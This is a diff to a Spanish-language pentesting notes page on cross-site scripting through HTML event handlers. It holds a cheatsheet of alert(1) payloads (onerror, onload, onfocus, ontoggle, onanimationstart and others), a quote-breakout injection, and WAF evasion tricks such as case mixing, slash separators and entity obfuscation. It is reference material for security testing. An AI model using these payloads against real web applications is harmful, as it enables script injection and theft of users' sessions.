@@ -15,23 +15,16 @@ ___
 
 ## Cheatsheet
 
-|**Evento**|**Payload de Ejemplo**|**Contexto de Ejecución y Notas**|
+|**Vector / Manejador**|**Payload de Ejemplo**|**Contexto de Inyección y Explotación**|
 |---|---|---|
-|`onerror`|`<img src="x" onerror="alert(1)">`|Automático. Se dispara al fallar la carga de un recurso (origen inválido `x`). Altamente confiable.|
-|`onload`|`<svg onload="alert(1)">`|Automático. Ejecuta el script tan pronto como el elemento se renderiza en la página.|
-|`onfocus`|`<input autofocus onfocus="alert(1)">`|Automático / Interactivo. Combina el atributo `autofocus` para forzar el foco del navegador sobre el elemento.|
-|`onmouseover`|`<b onmouseover="alert(1)">Texto</b>`|Interactivo. Requiere que la víctima pase el cursor sobre el elemento renderizado.|
-|`onclick`|`<a href="#" onclick="alert(1)">Click</a>`|Interactivo. Depende del clic directo del usuario. Común en atributos de enlaces preexistentes.|
-|`onanimationstart`|`<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>`|Automático. Asocia una animación CSS vacía a un elemento y dispara el script al iniciarla.|
-|`onhashchange`|`<body onhashchange="alert(1)"><a href="#x">Click</a>`|Interactivo. Se ejecuta cuando cambia el fragmento de la URL (el ancla `#`).|
-
-___
-
-## Overview
-
-Cuando las defensas de una aplicación web, como un [[Web Application Firewall]] (WAF) o un filtro de [[Sanitización]], bloquean explícitamente la etiqueta de script estándar, recurro a vectores alternativos. La inyección a través de manejadores de eventos (event handlers) HTML permite ejecutar código JavaScript aprovechando el ciclo de vida de las etiquetas estándar del [[DOM]] o la interacción del usuario.
-
-El principio radica en inyectar atributos específicos (que comienzan con `on...`) dentro de etiquetas HTML permitidas, forzando al navegador a ejecutar el payload cuando se cumpla la condición del evento en lugar de depender de la ejecución directa de un bloque `<script>`.
+|`onerror`|`<img src="x" onerror="alert(1)">`|**Automático.** El evento se dispara instantáneamente cuando el navegador no puede cargar el recurso (origen inválido `x`). Es uno de los vectores más confiables y utilizados.|
+|`onload`|`<svg onload="alert(1)">`|**Automático.** Ejecuta el código tan pronto como el elemento se renderiza en el [[DOM]]. Excelente alternativa cuando las etiquetas de imagen están filtradas.|
+|`onfocus`|`<input autofocus onfocus="alert(1)">`|**Automático / Interactivo.** Al combinarlo con el atributo `autofocus`, obligo al navegador a centrarse en el elemento de inmediato, disparando el evento sin requerir un clic del usuario.|
+|`onmouseover`|`<h1 onmouseover="alert(1)">Texto</h1>`|**Interactivo.** Requiere que la víctima pase el cursor por encima del elemento. Útil para evadir bloqueos estrictos sobre eventos de ejecución automática.|
+|`onclick`|`<a href="#" onclick="alert(1)">Click</a>`|**Interactivo.** Depende de la acción explícita del usuario. Frecuente al escapar del valor de un atributo para inyectar un nuevo manejador (`" onclick="alert(1)`).|
+|`onanimationstart`|`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`|**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.|
+|`ontoggle`|`<details open ontoggle="alert(1)">`|**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.|
+|`onhashchange`|`<body onhashchange="alert(1)"><a href="#x">Ir</a>`|**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.|
 
 ### Inyección en Contextos Preexistentes
 
@@ -48,9 +41,20 @@ La efectividad de los manejadores de eventos se maximiza cuando no es posible in
 
 ___
 
-## Evasión de Filtros Estructurales
+### Evasión de Filtros Estructurales
 
 Dado que los manejadores de eventos operan como atributos HTML, se benefician de las reglas de decodificación permisivas de los motores de los navegadores, ofreciendo vías adicionales para eludir restricciones de entrada:
 - **Insensibilidad a Mayúsculas:** Los nombres de atributos no distinguen entre mayúsculas y minúsculas en HTML. `oNeRrOr=alert(1)` es procesado de forma idéntica a `onerror=alert(1)`.
 - **Uso de Separadores Alternativos:** Los navegadores aceptan múltiples delimitadores entre atributos, no solo espacios. Se pueden utilizar barras diagonales (`/`) u otros espacios en blanco. Ej: `<svg/onload=alert(1)>`
 - **Codificación de Entidades en el Payload:** A diferencia de la etiqueta de script directa, el contenido dentro de un manejador de eventos HTML se decodifica _antes_ de enviarse al intérprete de JavaScript. Esto me permite ofuscar el código mediante entidades HTML. Ej: `<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`
+
+
+___
+
+## Overview
+
+Cuando las defensas de una aplicación web, como un [[Web Application Firewall]] (WAF) o un filtro de [[Sanitización]], bloquean explícitamente la etiqueta de script estándar, recurro a vectores alternativos. La inyección a través de manejadores de eventos (event handlers) HTML permite ejecutar código JavaScript aprovechando el ciclo de vida de las etiquetas estándar del [[DOM]] o la interacción del usuario.
+
+El principio radica en inyectar atributos específicos (que comienzan con `on...`) dentro de etiquetas HTML permitidas, forzando al navegador a ejecutar el payload cuando se cumpla la condición del evento en lugar de depender de la ejecución directa de un bloque `<script>`.
+
+___
